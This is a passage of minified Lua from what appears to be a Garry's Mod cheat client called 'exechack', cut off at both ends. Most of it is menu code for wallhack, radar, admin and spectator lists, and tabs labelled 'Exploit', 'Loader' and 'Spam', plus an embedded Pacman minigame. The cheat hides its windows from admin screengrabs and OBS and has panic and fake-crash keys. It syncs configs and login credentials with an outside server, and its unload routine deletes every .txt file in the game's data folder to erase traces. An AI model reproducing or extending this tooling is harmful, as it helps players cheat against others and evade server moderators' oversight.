cfgtable:Remove()end;cfgtable=vgui.Create("DScrollPanel",tableselect)cfgtable:SetPos(6,26)cfgtable:SetSize(448,186)cfgtable.Paint=function(a7,a8,a9)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)end;local dm=3;for w,x in pairs(exec_List("C:/exechack")or{})do if not x:find(".lua")and x~="loginandpassword"then local dn=x:Replace(".cfgexec","")a1(dn,3,dm,select(1,surface.GetTextSize(dn))+10,25,cfgtable,function()aa(54,58+27,function()a1("Load",3,3,38,25,doplpanel,function()file.Write(b.maincfg,util.TableToJSON(n(util.JSONToTable(exec_Read("C:/exechack".."/"..x)))))doplpanel:Close()end)a1("Save",3,30,38,25,doplpanel,function()exec_Write("C:/exechack".."/"..x,file.Read(b.maincfg,"DATA"))doplpanel:Close()end)a1("Delete",3,30+27,48,25,doplpanel,function()exec_Delete("C:/exechack".."/"..x)aq()doplpanel:Close()end)end)end)dm=dm+27 end;local dx={}http.Post("https://execcc.online/hacka/account/cfg.php",{a="g",user=username,pass=password},function(a)for h,m in pairs(string.Explode("|",a)or{})do if m==""then else if not dx[m]then a1(m,3,dm,select(1,surface.GetTextSize(m))+10,25,cfgtable,function()aa(54,58+27,function()a1("Load",3,3,38,25,doplpanel,function()http.Post("https://execcc.online/hacka/account/cfg.php",{a="re",user=username,pass=password,name=m},function(a)file.Write(b.maincfg,util.TableToJSON(n(util.JSONToTable(a))))timer.Simple(0.3,function()doplpanel:Close()end)end)end)a1("Save",3,30,38,25,doplpanel,function()http.Post("https://execcc.online/hacka/account/cfg.php",{a="c",user=username,pass=password,name=m,cfg=file.Read(b.maincfg,"DATA")})end)a1("Delete",3,30+27,48,25,doplpanel,function()http.Post("https://execcc.online/hacka/account/cfg.php",{a="r",user=username,pass=password,name=m})timer.Simple(0.3,function()aq()doplpanel:Close()end)end)end)end)dm=dm+27;dx[m]=true end end end end)end end;a1("Create",6,214,50,25,tableselect,function()aa(200-86,58,function()a1("Save on Disc",3,3,100,25,doplpanel,function()Derma_StringRequest("Config","Name","",function(T)exec_CreateDir("C:/exechack")exec_Write("C:/exechack".."/"..T..".cfgexec",file.Read(b.maincfg,"DATA"))timer.Simple(0.3,function()aq()end)end)end)a1("Save on server",3,30,150-42,25,doplpanel,function()Derma_StringRequest("Config","Name","",function(T)http.Post("https://execcc.online/hacka/account/cfg.php",{a="c",user=username,pass=password,name=T,cfg=file.Read(b.maincfg,"DATA")})timer.Simple(0.3,function()aq()end)end)end)end)end)a1("Refresh",58,214,58,25,tableselect,aq)local cS=vgui.Create("DTextEntry",tableselect)cS:SetPos(200-82,214)cS:SetSize(200,25)cS:SetText("C:/exechack")cS:SetDisabled(true)cS.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;aq()end)dv(54,"Theme",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DScrollPanel",dt)tableselect:SetPos(3,52)tableselect:SetSize(300+160,245)tableselect.VBar.Paint=function(cJ,ac,ad)draw.RoundedBox(0,0,0,ac,ad,Color(0,0,0,50))end;tableselect.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;tableselect.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;local dy=vgui.Create("DScrollPanel",tableselect)dy:SetPos(0,3)dy:SetSize(300+160-3,245+22-25-3)dy.Paint=function(a7,a8,a9)end;dy.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;dy.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;surface.SetFont("hack_font_18")local aJ=27;local function dz(M,aq)local aK=vgui.Create("DButton",dy)aK:SetSize(select(1,surface.GetTextSize(M))+10,25)aK:SetPos(29,aJ)aK:SetFont("hack_font_18")aK:SetText(M)aK:SetTextColor(b.colortext)aK.Paint=function()end;local d9=vgui.Create("DButton",dy)d9:SetSize(25,25)d9:SetPos(3,aJ)d9:SetText('')d9.Paint=function(F,ac,ad)draw.RoundedBox(0,0,0,ac,ad,t[aq])end;d9.DoClick=function()aa(127,153+3,function()local am=vgui.Create("DColorMixer",doplpanel)am:SetPos(3,3)am:SetSize(121,150)am:SetPalette(false)am:SetWangs(false)am:SetColor(t[aq])am.ValueChanged=function()y(aq,am:GetColor())end end)end;aJ=aJ+27 end;a1("Reset",3,0,55-10,25,dy,function()y("MENU_STYLE_TEXT",Color(255,255,255))y("MENU_STYLE_TEXT2",Color(200,200,200))y("MENU_STYLE_TITLETEXT",Color(255,255,255))y("MENU_STYLE_TITLEBAR",Color(45,45,45))y("MENU_STYLE_WINDOWBG",Color(35,35,35))y("MENU_STYLE_MENUBARBG",Color(35,35,35))y("MENU_STYLE_BUTTON",Color(35,35,35))y("MENU_STYLE_BUTTONHOVERED",Color(120,120,120,100))y("MENU_STYLE_BORDER",Color(100,100,100))y("MENU_STYLE_SLIDER",Color(255,255,255))y("MENU_STYLE_СHECKBOXACTIVE",Color(100,100,255))y("MENU_STYLE_TEXTENTRY",Color(25,25,25))end)dz("Text","MENU_STYLE_TEXT")dz("Text2","MENU_STYLE_TEXT2")dz("TitleText","MENU_STYLE_TITLETEXT")dz("TitleBar","MENU_STYLE_TITLEBAR")dz("WindowBg","MENU_STYLE_WINDOWBG")dz("MenuBarBg","MENU_STYLE_MENUBARBG")dz("Button","MENU_STYLE_BUTTON")dz("ButtonHovered","MENU_STYLE_BUTTONHOVERED")dz("Border","MENU_STYLE_BORDER")dz("Slider","MENU_STYLE_SLIDER")dz("CheckBox","MENU_STYLE_СHECKBOXACTIVE")dz("TextEntry","MENU_STYLE_TEXTENTRY")end)dv(44,"Fonts",function()local dA=0;if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dt)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a7,a8,a9)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,150,61)draw.SimpleText("Player","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,144,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(155,3,150,61)draw.SimpleText("Entity","hack_font_16",158,6,b.colortext2)draw.RoundedBox(0,158,23,144,1,b.border)if IsInGame()then if CurTime()>dA then p([[
surface.CreateFont("fontforplayers",{font="]]..t["WH_PLAYER_FONT"]..[[",size=]]..t["WH_PLAYER_FONT_SIZE"]..[[,shadow=true})
surface.CreateFont("fontforentitys",{font="]]..t["WH_ENTITY_FONT"]..[[",size=]]..t["WH_ENTITY_FONT_SIZE"]..[[,shadow=true})
]])dA=CurTime()+1.5 end end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,66,150,61-15)draw.SimpleText("Menu(Restart)","hack_font_16",6,69,b.colortext2)draw.RoundedBox(0,6,86,144,1,b.border)end;local dB={"Akbar","Coolvetica","Roboto","Arial","Verdana","Courier New","Tahoma","Marlett","ControlBG"}aj(6,26,"WH_PLAYER_FONT",dB,"Font",tableselect)local dw=vgui.Create("DPanel",tableselect)dw:SetPos(0,26+16)dw:SetSize(270,30)dw.Paint=function()end;an(dw,12,40,"WH_PLAYER_FONT_SIZE",-98,0,250,"Size")aj(6+152,26,"WH_ENTITY_FONT",dB,"Font",tableselect)local dw=vgui.Create("DPanel",tableselect)dw:SetPos(152,26+16)dw:SetSize(270,30)dw.Paint=function()end;an(dw,12,40,"WH_ENTITY_FONT_SIZE",-98,0,250,"Size")aj(6,89,"MENU_FONT",dB,"Font",tableselect)end)dv(63,"Settings",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dt)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a7,a8,a9)draw.SimpleText("Main","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,448,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,454,a9-6)end;local dy=vgui.Create("DScrollPanel",tableselect)dy:SetPos(0,25)dy:SetSize(300+160-6,245-25-6)dy.Paint=function(a7,a8,a9)end;dy.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;dy.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;surface.SetFont("hack_font_18")aI("Menu Key",5,23-25,dy)aE("Key","MENU_OPENKEY",6,39-25,0,dy)aI("Add Entity/Player Key",6,63-25,dy)aE("Key","MISC_ADDENTITYFRIEND",6,79-25,0,dy)aI("Panic Key",5,103-25,dy)aE("Key","PANICKEY",6,121-25,0,dy)aI("Fake Crash Key",5,103+27-10,dy)aE("Key","FAKECRASHKEY",6,136,0,dy)au("OBS bypass","OBSBYPASS",6,136+26,dy,"Hide all DFrame")au("Cloud Radar","CLOUDRADAR",6,136+26+17,dy,"web radar")a1("..",135,136+26+17+1,15,15,dy,function()aa(200,50,function()surface.SetFont("hack_font_18")a1("Copy link",3,3,75,25,doplpanel,function()a0("Link copied")SetClipboardText("https://execcc.online/hacka/radar.php?user="..username or'')end)aI("Supports: rp_bangclaw, rp_downtown_tits_v1",3,3+27,doplpanel)end)end)a1("No".."tification",6,163+17+17,90,25,dy,function()aa(200,52+17,function()an(doplpanel,1,10,"NOIFICATION_SPEED",-101,-3,250,"Speed")au("Screengraben","NOIFICATION_SCREENGRAB",3,16,doplpanel,"If admin view you screen")au("You killed/damaged","NOIFICATION_DAMAGEDMEBY",3,33,doplpanel)au("Add Entity/Friend","NOIFICATION_ADDENTITYFRIEND",3,33+17,doplpanel)end)end)a1("Menu",6,190+17+17,46,25,dy,function()aa(127,26,function()aj(3,3,"MENU_TITLEPOS",{"Up","Down"},"MenuBar Position")end)if l["MENU_TITLEPOS"]=="Down"then menulist:SetPos(0,ScrH()-31)else menulist:SetPos(0,0)end end)a1("Unload",6,217+17+17,55,25,dy,function()y("WH_INFO",false)y("WH_RADAR",false)y("WH_MIRROR",false)y("MISC_SPECTATORLIST",false)y("MISC_ADMINLIST",false)y("OBSBYPASS",false)pnlMainMenu:Call("UpdateNewsList("..b.shitnews..","..cookie.GetString("hide_newslist","false")..")")timer.Simple(3,function()if IsInGame()then local dC="timer.Remove('"..b.timer.."')"for h,m in pairs(b.hooks)do dC=dC.."hook.Remove('"..h.."','"..m.."')"end;p(dC)end;timer.Simple(3,function()for h,m in pairs(file.Find("*.txt","DATA"))do file.Delete(m)end end)hide()timer.Remove("check")hook.Remove("Think","fff")hook.Remove("bitch","1")end)end)end)dt:Hide()local dD=3;local function dE(M,Z,aq,derma)local a6=vgui.Create("DButton",menulist)a6:SetFont("hack_font_18")a6:SetText(M)a6:SetTextColor(b.colortext)a6:SetSize(Z,25)a6:SetPos(dD,3)a6.Paint=function(a7,a8,a9)draw.RoundedBox(0,0,0,a8,a9,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)if a6.Hovered or _[aq]then draw.RoundedBox(0,0,0,a8,a9,b.buttonhovered)end end;a6.DoClick=function()_[aq]=not _[aq]if _[aq]then derma:Show()else derma:Hide()end end;dD=dD+2+Z end;local function dF(M,Z,aq,z)local a6=vgui.Create("DButton",menulist)a6:SetFont("hack_font_18")a6:SetText(M)a6:SetTextColor(b.colortext)a6:SetSize(Z,25)a6:SetPos(dD,3)a6.Paint=function(a7,a8,a9)draw.RoundedBox(0,0,0,a8,a9,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)if a6.Hovered then draw.RoundedBox(0,0,0,a8,a9,b.buttonhovered)end;if t[aq]then draw.RoundedBox(0,0,0,a8,a9,b.buttonhovered)end end;a6.DoClick=function()y(aq,not t[aq])end;if z then a6.DoRightClick=z end;dD=dD+2+Z end;local function dG(M,z,Z)a1(M,dD,3,Z,25,menulist,z)dD=dD+2+Z end;menulist=vgui.Create("DFrame")menulist:SetSize(ScrW(),31)if l["MENU_TITLEPOS"]=="Down"then menulist:SetPos(0,ScrH()-31)else menulist:SetPos(0,0)end;menulist:SetTitle("")menulist:MakePopup()menulist:SetDraggable(false)menulist:ShowCloseButton(false)menulist.Paint=function(a7,a8,a9)draw.RoundedBox(0,0,0,a8,a9,b.menubarbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)end;dE("Spam",48,"spam",cO)dE("Logs",40,"logs",cE)dE("Target",48+4,"itemlist",d0)dE("Loader",48+6,"glualoder",dk)dE("Exploit",48+6,"exploit",cY)dE("Chat",36,"chatgay",cX)dF("Info",50-16,"WH_INFO")dF("Radar",50-4,"WH_RADAR",function()aa(150,32+17,function()an(doplpanel,1,200,"WH_RADAR_DISTANCE",-101,-3,250,"Distance")an(doplpanel,1,7,"WH_RADAR_SIZE",-101,11,250,"Size")au("Show Names","RDRSNA",3,30,doplpanel,"Show player's name on radar")end)end)dF("Mirror",50-4,"WH_MIRROR",function()aa(127,26,function()aj(3,3,"WH_MIRROR_TYPE",{"Type 1","Type 2"},"Type",doplpanel)end)end)dF("Spectators list",104,"MISC_SPECTATORLIST")dF("Admins list",100-16,"MISC_ADMINLIST")dG("Games",function()aa(100,85,function()a1("Pacman",3,3,60,25,doplpanel,function()steamworks.Subscribe("177212166")steamworks.ApplyAddons()PANEL={}surface.CreateFont("FONT",{font="akbar",size=30,weight=100,blursize=0,scanlines=0,antialias=true,underline=false,italic=false,strikeout=false,symbol=false,rotary=false,shadow=true,additive=false,outline=true})surface.CreateFont("CounterFont",{font="akbar",size=ScrH()/6,weight=500,blursize=0,scanlines=0,antialias=true,underline=false,italic=false,strikeout=false,symbol=false,rotary=false,shadow=true,additive=false,outline=true})function PANEL:Init()self.panel=vgui.Create("DPanel",self)function self.panel:Paint()end;self.Button={}self.Button[1]=vgui.Create("DImageButton",self)self.Button[1].DoClick=function(self)self.Parent:PressedFirstButton()end;self.Button[2]=vgui.Create("DImageButton",self)self.Button[2].DoClick=function(self)self.Parent:PressedSecondButton()end;self.Button[1].Parent=self;self.Button[2].Parent=self;self.Counter=9;self.delay=CurTime()+1 end;function PANEL:Paintbackground()end;function PANEL:PressedFirstButton()end;function PANEL:PressedSecondButton()end;function PANEL:Paint(a,D)if self.Counter>=4 then draw.SimpleText(" "..self.Counter.." ","CounterFont",a/2,D/2,Color(255,200,0,255),TEXT_ALIGN_CENTER)else draw.SimpleText(" "..self.Counter.." ","CounterFont",a/2,D/2,Color(255,0,0,255),TEXT_ALIGN_CENTER)end end;function PANEL:PaintOver(a,D)end;function PANEL:PerformLayout(a,D)self.Button[1]:SetPos(0,D/2)self.Button[1]:SetSize(a/4,D/2-5)self.Button[1]:SetImage("pacman/menu/continue.png")self.Button[2]:SetPos(a-a/4+6,D/2)self.Button[2]:SetSize(a/4,D/2-5)self.Button[2]:SetImage("pacman/menu/exit.png")end;function PANEL:Close()self:Remove()end;function PANEL:Think()if CurTime()>self.delay then self.Counter=self.Counter-1;surface.PlaySound("pacman/counter.wav")self.delay=CurTime()+1 end;if self.Counter<=0 then self:PressedFirstButton()self:Close()end end;derma.DefineControl("AEndMenu","",PANEL,"Panel")local E="C########=########c\n".."|00000000|00000000|\n".."|0<>0<#>0v0<>0<#>0|\n".."|00000000000000000|\n".."|0<>0^0<#=#>0^0<>0|\n".."|0000|000|000|0000|\n".."l==>0l#>0v0<#r0<==r\n".."Bdd>0v0000000v0<ddb\n".."0000000C>0<c0000000\n".."C==>0^0|s00|0^0<==c\n".."ldd>0v0B###b0v0<ddr\n".."|00000000000000000|\n".."|0<c0<#######>0C>0|\n".."|00|00000000000|00|\n".."l>0v0^0<###>0^0v0<r\n".."|0000|0000000|0000|\n".."|0<##d>0<#>0<d##>0|\n".."|00000000000000000|\n".."B#################b"CreateClientConVar("ghdfopksdfglmer",0,false,false)local F={}local e={}local w={{x=2,y=3},{x=18,y=3},{x=2,y=14},{x=18,y=14}}local T=table.Copy(w)local ad=1;local d=200;local dh=1;local aO=1;local av=1;local di=1;local bU=1;local ax=0;local a6={}local a7={}local a8=1;local a9=0;local dj={}local aw=false;local m=false;local a=0;local D=0;local ac=0;local ay=false;local aA=3;local aB=true;local aC=5;local aD=1;local dH=0;local c8={}F["Up"]="up"F["Right"]="right"F["Down"]="down"F["Left"]="left"F["stop"]="stop"e["Up"]="up"e["Right"]="right"e["Down"]="down"e["Left"]="left"local function dI(az,dJ,a,D,dK,dL,dM)surface.SetDrawColor(dK.r,dK.g,dK.b,dK.a)surface.SetMaterial(dL)surface.DrawTexturedRect(az-dM,dJ-dM,a+dM*2,D+dM*2)end;local function dN(aF,aG,aH)table.insert(F,{Pac={dir=aF,pos=aG,tex=aH}})end;local function dO(aF,dr,aG,dq,dm,aH)table.insert(e,{G={id=dm,dir=aF,mode=dr,pos=aG,oldpos=dq,tex=aH}})end;local function x()aA=3;ac=0;a8=1;ay=false;table.Empty(a7)for dP,dn in ipairs(c8)do AddDot(dn.x,dn.y)end;T=table.Copy(w)end;local function dQ(az,dJ)local dR=E;local dS=string.Explode("\n",dR)return string.GetChar(dS[dJ],az)end;local function AddDot(az,dJ)table.insert(a7,{x=math.Round(az/a),y=math.Round(dJ/D),tex="pacman/star.png"})end;local function dT(b4,az,dJ)for dP,dn in ipairs(b4)do if dn.x==az and dn.y==dJ then return dP end end end;local function h(dm,aH)for dP,dn in ipairs(e)do if dn.G.id==dm then dn.G.tex=aH end end end;local function dU(b4,az,dJ,dV)if dT(b4,az,dJ)==nil then return end;if dV=="normal"then table.remove(b4,dT(b4,az,dJ))ac=ac+10 elseif dV=="special"then table.remove(b4,dT(b4,az,dJ))ax=CurTime()+5;for dP=1,4 do SetGhostMode(tostring(dP),"scatter")end elseif dV=="speical bon"then table.remove(b4,dT(b4,az,dJ))ac=ac+25*a8 end;surface.PlaySound("pacman/chomp.wav")end;local function dW(dm,aF)for dP,dn in ipairs(e)do if dn.G.id==dm then dn.G.dir=aF end end end;local function dX()return F[1].Pac.dir end;local function dA(aF)F[1].Pac.dir=aF end;local function dY(dm)for dP,dn in ipairs(e)do if dn.G.id==dm then return dn.G.pos end end end;function SetGhostMode(dm,dr)for dP,dn in ipairs(e)do if dn.G.id==dm then dn.G.mode=dr end end end;local function dZ(dm)for dP,dn in ipairs(e)do if dn.G.id==dm then return dn.G.mode end end end;local function d_(dm,aG)for dP,dn in ipairs(e)do if dn.G.id==dm then dn.G.pos=aG end end end;local function e0(dm)for dP,dn in ipairs(e)do if dn.G.id==dm then return dn.G end end end;local function e1(dm)for dP,dn in ipairs(e)do if dn.G.id==dm then return dn.G.oldpos end end end;local function e2(dm)for dP,dn in ipairs(e)do if dn.G.id==dm then return dn.G.dir end end end;local function e3(aG)F[1].Pac.pos=aG end;local function e4()return F[1].Pac.pos end;local function B(dm,aG)if dm~=nil then local e5,e6=dY(dm).x,dY(dm).y;local e7,e8=aG.x,aG.y;local e9=math.Round(math.deg(math.atan2(e7-e5,e8-e6)))if e9>90 and e9<180 then return{a="up",b="right"}elseif e9==90 then return{a="right",b="right"}elseif e9<90 and e9>0 then return{a="down",b="right"}elseif e9==0 then return{a="down",b="down"}elseif e9<0 and e9>-90 then return{a="down",b="left"}elseif e9==-90 then return{a="left",b="left"}elseif e9<-90 and e9>-180 then return{a="up",b="left"}elseif e9==-180 or e9==180 then return{a="up",b="up"}end else Error("[Royal Arcade Games] function |CheckDirection| first 'arg' a nil value\n")end end;local function ea(aF,dm,eb)if dm==nil then Error("[Royal Arcade Games] function |CanMove| second 'arg' a nil value\n")end;local az,dJ=dY(dm).x,dY(dm).y;if aF=="up"then if dQ(az,dJ-1)=="0"and dJ-1~=eb.y then return true else return false end elseif aF=="right"then if dQ(az+1,dJ)=="0"and az+1~=eb.x then return true else return false end elseif aF=="left"then if dQ(az-1,dJ)=="0"and az-1~=eb.x then return true else return false end elseif aF=="down"then if dQ(az,dJ+1)=="0"and dJ+1~=eb.y then return true else return false end end end;local function ec()if not ay then local ed=vgui.Create("AEndMenu")ed:SetPos(ScrW()/2-ScrW()/2/2,ScrH()/25*5)ed:SetSize(ScrW()/2,ScrW()/7)function ed:PressedFirstButton()x()self:Close()end;function ed:PressedSecondButton()RunConsoleCommand("ghdfopksdfglmer","0")x()self:Close()end end end;local function ee(dm,aF,ef,eb)if aF==nil then if dQ(ef.x+1,ef.y)=="0"and ef.x+1~=eb.x then dW(dm,"right")elseif dQ(ef.x-1,ef.y)=="0"and ef.x-1~=eb.x then dW(dm,"left")elseif dQ(ef.x,ef.y+1)=="0"and ef.y+1~=eb.y then dW(dm,"down")elseif dQ(ef.x,ef.y-1)=="0"and ef.y-1~=eb.y then dW(dm,"up")end else if aF=="up"and ef.y-1~=eb.y then dW(dm,"up")elseif aF=="right"and ef.x+1~=eb.x then dW(dm,"right")elseif aF=="left"and ef.y+1~=eb.y then dW(dm,"left")elseif aF=="down"and ef.x-1~=eb.x then dW(dm,"down")elseif aF=="stop"then dW(dm,"stop")end end end;dO("left","normal",{x=10,y=10},{x=3,y=4},"1","pacman/red.png")dO("left","normal",{x=11,y=10},{x=5,y=18},"2","pacman/blue.png")dO("left","normal",{x=12,y=10},{x=10,y=18},"3","pacman/pinky.png")dO("left","normal",{x=11,y=9},{x=8,y=18},"4","pacman/orange.png")local function eg()if GetConVarNumber("ghdfopksdfglmer")==1 then local dR=E;local eh=string.Explode("\n",dR)local ei=string.ToTable(eh[1])surface.SetDrawColor(0,0,0,255)surface.DrawRect(0,0,ScrW(),ScrH())a,D=math.floor(ScrW()/(#ei-1)),math.floor(ScrH()/#eh)for ej,ek in ipairs(eh)do for dP,dn in ipairs(string.ToTable(ek))do if dn=="0"then if dP*ej<=323 and not aw then table.insert(c8,{x=a*dP-a/2,y=ej*D-D/2,tex="pacman/star.png"})AddDot(a*dP-a/2,ej*D-D/2)table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="walk",id=dP*ej})else aw=true end elseif dn=="#"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_line.png"})else m=true end elseif dn=="|"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_stright.png"})else m=true end elseif dn=="l"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_wall_left.png"})else m=true end elseif dn=="r"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_wall_right.png"})else m=true end elseif dn=="d"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_wall_bottom.png"})else m=true end elseif dn=="="then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_middle.png"})else m=true end elseif dn=="<"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corn_left.png"})else m=true end elseif dn==">"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corn_right.png"})else m=true end elseif dn=="^"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corn_top.png"})else m=true end elseif dn=="v"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corn_bottom.png"})else m=true end elseif dn=="c"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corner_tright.png"})else m=true end elseif dn=="C"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corner_tleft.png"})else m=true end elseif dn=="b"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corner_bright.png"})else m=true end elseif dn=="B"then if dP*ej<=360 and not m then table.insert(a6,{x=a*dP/a,y=ej*D/D,typ="wall",id=dP*ej,tex="pacman/pacman_corner_bleft.png"})else m=true end elseif dn=="e"then if not table.HasValue(dj,dP)then table.insert(dj,dP)end elseif dn=="s"then if not table.HasValue(dj,dP)then table.insert(dj,dP)dN("left",{x=10,y=14},"pacman/pacclose.png")end end end end;for el,em in ipairs(a6)do if em.typ=="walk"then elseif em.typ=="wall"then surface.SetDrawColor(0,0,255,255)surface.SetMaterial(Material(em.tex))surface.DrawTexturedRect(em.x*a-a,em.y*D-D,a,D)end end;for dP,dn in ipairs(a7)do surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material(dn.tex))surface.DrawTexturedRect((dn.x-0.5)*a,(dn.y-0.5)*D,a/4,D/4)end;for dP=1,4 do if CurTime()>ax and dZ(tostring(dP))~="killed"then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material(e[dP].G.tex))surface.DrawTexturedRect(dY(tostring(dP)).x*a-a,dY(tostring(dP)).y*D-D,a,D)SetGhostMode(tostring(dP),"normal")elseif CurTime()<ax and dZ(tostring(dP))=="scatter"then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/ghostscaredblue1.png"))surface.DrawTexturedRect(dY(tostring(dP)).x*a-a,dY(tostring(dP)).y*D-D,a,D)elseif dZ(tostring(dP))=="killed"then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/ghosteyes.png"))surface.DrawTexturedRect(dY(tostring(dP)).x*a-a,dY(tostring(dP)).y*D-D,a,D)end end;if aB then aC=aC+0.5 elseif not aB then aC=aC-0.5 end;if aC>=10 then aB=false elseif aC<=0 then aB=true end;for dP,dn in ipairs(T)do dI((dn.x-0.5)*a,(dn.y-0.5)*D,a/4,D/4,{r=255,g=255,b=255,a=255},Material("pacman/item.png"),aC)end;surface.SetDrawColor(255,255,0,255)surface.SetMaterial(Material("pacman/pac.png"))surface.DrawTexturedRectRotated(e4().x*a-a/2,e4().y*D-D/2,a,D,a9)draw.SimpleText("Score: "..ac.." ","ChatFont",10,10,Color(255,255,255,255),TEXT_ALIGN_LEFT)draw.SimpleText("Level: "..a8 .." ","ChatFont",10,30,Color(255,255,255,255),TEXT_ALIGN_LEFT)for en=1,aA do surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/pac.png"))surface.DrawTexturedRect(100+en*30,25,30,30)end;if CurTime()<dH and aA~=0 then surface.SetDrawColor(255,255,255,math.sin(CurTime()*1.5)*255)surface.SetMaterial(Material("pacman/getready.png"))surface.DrawTexturedRect(a*7.5,D*11,a*4,D)end;if aA==0 then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/gameover.png"))surface.DrawTexturedRect(a*7.5,D*11,a*4,D)ec()ay=true end;draw.SimpleText("PRESS BACKSPACE TO CLOSE","ChatFont",10,55,Color(255,255,255))end end;hook.Add("DrawOverlay","Pacman",eg)local function eo()if not gui.IsGameUIVisible()then RunConsoleCommand("ghdfopksdfglmer","0")end;if input.IsKeyDown(KEY_BACKSPACE)and GetConVarNumber("ghdfopksdfglmer")==1 then RunConsoleCommand("ghdfopksdfglmer","0")end;if GetConVarNumber("ghdfopksdfglmer")==1 and#F>=1 then local ep,eq=e4().x,e4().y;directionx,directiony=0,0;gdirectionx,gdirectiony=0,0;gdirectionx1,gdirectiony1=0,0;gdirectionx2,gdirectiony2=0,0;gdirectionx3,gdirectiony3=0,0;dU(a7,ep,eq,"normal")dU(T,ep,eq,"special")dU(a7,10,9,"normal")dU(a7,10,10,"normal")dU(a7,11,10,"normal")if input.IsKeyDown(KEY_UP)and dQ(ep,eq-1)=="0"and aA~=0 then dA(F["Up"])a9=270 elseif input.IsKeyDown(KEY_DOWN)and dQ(ep,eq+1)=="0"and aA~=0 then dA(F["Down"])a9=90 elseif input.IsKeyDown(KEY_RIGHT)and dQ(ep+1,eq)=="0"and aA~=0 then dA(F["Right"])a9=180 elseif input.IsKeyDown(KEY_LEFT)and dQ(ep-1,eq)=="0"and aA~=0 then dA(F["Left"])a9=0 end;if F[1].Pac.dir==F["Up"]and dQ(ep,eq-1)=="0"then directiony=-1 elseif F[1].Pac.dir==F["Down"]and dQ(ep,eq+1)=="0"then directiony=1 elseif F[1].Pac.dir==F["Right"]and dQ(ep+1,eq)=="0"then directionx=1 elseif F[1].Pac.dir==F["Left"]and dQ(ep-1,eq)=="0"then directionx=-1 elseif F[1].Pac.dir==F["stop"]then directionx=0;directiony=0 end;if e2("1")==F["Up"]and ea(e2("1"),"1",e1("1"))then gdirectiony=-1 elseif e2("1")==F["Down"]and ea(e2("1"),"1",e1("1"))then gdirectiony=1 elseif e2("1")==F["Right"]and ea(e2("1"),"1",e1("1"))then gdirectionx=1 elseif e2("1")==F["Left"]and ea(e2("1"),"1",e1("1"))then gdirectionx=-1 